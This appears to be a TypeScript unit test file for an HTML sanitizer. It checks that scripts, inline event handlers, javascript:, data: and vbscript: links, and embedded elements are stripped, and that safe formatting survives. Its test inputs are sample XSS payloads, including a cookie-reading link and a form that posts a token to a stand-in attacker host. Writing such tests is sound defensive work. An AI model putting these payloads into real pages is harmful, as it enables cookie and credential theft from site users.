import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';

// Setup browser DOM environment for testing
const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
(globalThis as any).window = dom.window;
(globalThis as any).document = dom.window.document;
(globalThis as any).Node = dom.window.Node;

import { sanitizeHtml } from '../utils/sanitizeHtml';

describe('sanitizeHtml Utility', () => {
  it('strips <script> tags completely', () => {
    const malicious = '<p>Normal text</p><script>alert("xss")</script>';
    const clean = sanitizeHtml(malicious);
    assert.strictEqual(clean.includes('<script>'), false);
    assert.strictEqual(clean.includes('alert('), false);
    assert.ok(clean.includes('<p>Normal text</p>'));
  });

  it('strips malicious inline event handlers (onerror, onload, onclick, onmouseover)', () => {
    const payload = '<img src="https://example.com/pic.jpg" onerror="alert(1)" onload="evil()" onclick="bad()">';
    const clean = sanitizeHtml(payload);
    assert.strictEqual(clean.includes('onerror'), false);
    assert.strictEqual(clean.includes('onload'), false);
    assert.strictEqual(clean.includes('onclick'), false);
    assert.strictEqual(clean.includes('evil()'), false);
    assert.ok(clean.includes('src="https://example.com/pic.jpg"'));
  });

  it('neutralizes malicious javascript: URLs', () => {
    const malicious = '<a href="javascript:alert(document.cookie)">Malicious Link</a>';
    const clean = sanitizeHtml(malicious);
    assert.strictEqual(clean.includes('javascript:'), false);
    assert.strictEqual(clean.includes('document.cookie'), false);
    assert.ok(clean.includes('Malicious Link'));
  });

  it('neutralizes data: and vbscript: URIs in anchor tags', () => {
    const dataUri = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>';
    const vbscriptUri = '<a href="vbscript:msgbox(1)">Click</a>';
    assert.strictEqual(sanitizeHtml(dataUri).includes('data:text/html'), false);
    assert.strictEqual(sanitizeHtml(vbscriptUri).includes('vbscript:'), false);
  });

  it('strips dangerous embedded elements (iframe, object, embed, form)', () => {
    const malicious = `
      <div>
        <iframe src="https://attacker.com/exploit"></iframe>
        <object data="evil.swf"></object>
        <embed src="evil.swf">
        <form action="https://attacker.com/steal"><input name="token" value="secret"></form>
      </div>
    `;
    const clean = sanitizeHtml(malicious);
    assert.strictEqual(clean.includes('<iframe'), false);
    assert.strictEqual(clean.includes('<object'), false);
    assert.strictEqual(clean.includes('<embed'), false);
    assert.strictEqual(clean.includes('<form'), false);
    assert.strictEqual(clean.includes('<input'), false);
  });

  it('preserves legitimate formatting tags and structures', () => {
    const richContent = `
      <h1>Engineering Excellence</h1>
      <p>Building <strong>scalable</strong>, <em>high-throughput</em> systems with <a href="https://example.com" target="_blank" rel="noopener noreferrer">InfinytTech</a>.</p>
      <ul>
        <li>First point</li>
        <li>Second point</li>
      </ul>
      <blockquote>Trusted by enterprises worldwide.</blockquote>
      <pre><code>const valid = true;</code></pre>
    `;
    const clean = sanitizeHtml(richContent);
    assert.ok(clean.includes('<h1>Engineering Excellence</h1>'));
    assert.ok(clean.includes('<strong>scalable</strong>'));
    assert.ok(clean.includes('<em>high-throughput</em>'));
    assert.ok(clean.includes('<a href="https://example.com"'));
    assert.ok(clean.includes('<ul>'));
    assert.ok(clean.includes('<li>First point</li>'));
    assert.ok(clean.includes('<blockquote>'));
    assert.ok(clean.includes('<code>const valid = true;</code>'));
  });

  it('automatically adds rel="noopener noreferrer" to target="_blank" links for tabnabbing protection', () => {
    const rawLink = '<a href="https://partner.com" target="_blank">External Partner</a>';
    const clean = sanitizeHtml(rawLink);
    assert.ok(clean.includes('target="_blank"'));
    assert.ok(clean.includes('rel="noopener noreferrer"'));
  });

  it('gracefully handles null, undefined, empty, and non-string values', () => {
    assert.strictEqual(sanitizeHtml(null), '');
    assert.strictEqual(sanitizeHtml(undefined), '');
    assert.strictEqual(sanitizeHtml(''), '');
    assert.strictEqual(sanitizeHtml(12345 as any), '');
  });
});
